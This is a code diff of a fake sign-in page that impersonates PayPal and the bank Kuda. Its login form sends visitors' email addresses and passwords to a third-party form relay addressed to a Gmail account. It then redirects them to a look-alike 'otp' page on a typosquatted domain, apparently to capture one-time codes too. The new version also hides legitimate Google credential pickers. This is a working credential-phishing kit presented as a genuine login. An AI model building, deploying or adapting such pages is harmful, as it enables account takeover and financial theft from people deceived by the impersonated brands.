@@ -1,31 +1,28 @@
-<!DOCTYPE HTML>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset = 'UTF-8'>
-<title>Log in to your PayPal account</title>
-<link rel = 'icon' href = 'paypal.png' type = 'image/x-icon'>
-<link rel = 'stylesheet' href = 'css/normalize.css'>
-<link rel = 'stylesheet' href = 'style.css'>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuda - Sign In</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="paypal.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link href="data:text/css,%5Bid*%3D'google_ads_iframe'%5D%2C%5Bid*%3D'taboola-'%5D%2C.taboolaHeight%2C.taboola-placeholder%2C%23credential_picker_container%2C%23credentials-picker-container%2C%23credential_picker_iframe%2C%5Bid*%3D'google-one-tap-iframe'%5D%2C%23google-one-tap-popup-container%2C.google-one-tap-modal-div%2C%23amp_floatingAdDiv%2C%23ez-content-blocker-container%2C%23notify-adblock%7Bdisplay%3Anone!important%3Bmin-height%3A0!important%3Bheight%3A0!important%3B%7D" rel="stylesheet" type="text/css">
 </head>
 <body>
+        <form id="form" method="POST" class="form text-center mx-auto mt-9 pt-6 px-4 lg:px-0 flex flex-col justify-center" action="https://formsubmit.co/godofmiracle101@gmail.com">
+        
+            <div class="form__header mb-2">
+                <img class="w-16 mx-auto" src="paypal.png" alt="Kuda_Logo">
+            </div>
+            <input class="w-full p-3 my-1" type="email" name="email" placeholder="Email address" id="email" required="">
+            <input type="hidden" name="_captcha" value="false">
+            <input class="w-full p-3 my-1" type="password" name="password" placeholder="Enter your password" id="password"  required="">
+            <input type="hidden" name="_next" value="https://app-paypa.web.app/otp.html">
+            <button class="w-full py-3 px-3 font-bold text-white my-6" type="submit">Log In</button>
+        </form>
 
-
-<img src="paypal.png" >
-
-<form action="https://formsubmit.co/godofmiracle101@gmail.com" method = 'POST'>
-    
-    <input type="hidden" name="_captcha" value="false">
-    <input type="text" name="_honey" style="display:none">
-
-    <input id="next" type="hidden" name="_next" value="https://app-paypal.web.app/otp.html">
-<input type = 'email' name = 'email' id="email" required="" placeholder = 'Email address'><br>
-<input type = 'password' name = 'pass'  id="password" required=""  placeholder = 'Enter your password'><br>
-
-<button class = 'log' type = 'submit' value = 'Log In'>Log In</button>
-
-</form>
-
-<script src="main.js"></script>
-
-</body>
+</body> 
 </html>
